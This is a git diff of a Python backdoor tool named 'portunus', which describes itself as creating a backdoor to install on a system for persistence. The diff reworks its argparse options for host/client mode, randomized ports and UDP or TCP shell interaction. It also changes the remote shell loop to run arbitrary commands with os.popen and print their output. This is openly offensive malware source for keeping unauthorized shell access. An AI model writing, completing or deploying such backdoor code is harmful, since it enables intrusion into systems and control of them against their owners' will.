@@ -18,28 +18,27 @@ def parse_args():
         description="creates a backdoor to install on a system to gain persistence")
     parse = main_parser.add_mutually_exclusive_group()
     parse.add_argument(
-        '--test', help="puts portunus into testing mode in which all commands are run on local system", type=bool, default=False, action='store_true')
+        '--test', help="puts portunus into testing mode in which all commands are run on local system", action='store_true')
     parser = parse.add_argument_group()
     client_server = parser.add_mutually_exclusive_group()
     client_server.add_argument(
-        '--host', help='establishes current connection as where clients will connect to')
+        '--host', help='establishes current connection as where clients will connect to', action='store_true')
     client_server.add_argument(
-        '--client', help='establishes current connextion as client issuing commends to the server')
+        '--client', help='establishes current connextion as client issuing commends to the server', action='store_true')
     port = parser.add_mutually_exclusive_group()
     port.add_argument(
         '-p', '--port', help='defines static connection port', type=int, nargs=1)
     port_randomization = port.add_argument_group()
     port_randomization.add_argument(
-        '-r', '--range', help='defines range of ports to randomize connection over', nargs=2)
+        '-r', '--range', help='defines range of ports to randomize connection over', type=int, nargs=2)
     port_randomization.add_argument(
-        '-s', '--seed', help='defines seed for port randomization to use')
+        '-s', '--seed', help='defines seed for port randomization to use', type=str, nargs=1)
     connection = parser.add_mutually_exclusive_group()
     connection.add_argument(
-        "-u", "--udp", help="utilizes udp for shell interation")
+        "-u", "--udp", help="utilizes udp for shell interation", action='store_true')
     connection.add_argument(
-        "-t", '--tcp', help="estbalishes tcp connection for shell interation")
-    main_parser.parse_args()
-    return main_parser
+        "-t", '--tcp', help="estbalishes tcp connection for shell interation", action='store_true')
+    return main_parser.parse_args()
 
 
 def run_shell():
@@ -53,7 +52,7 @@ def run_shell():
         if 'quit' == command or command == 'exit':
             break
         try:
-            os.system(command)
+            print(os.popen(command).read(), end='')
             if command[:3] == 'cd ':
                 try:
                     os.chdir(command[3:])
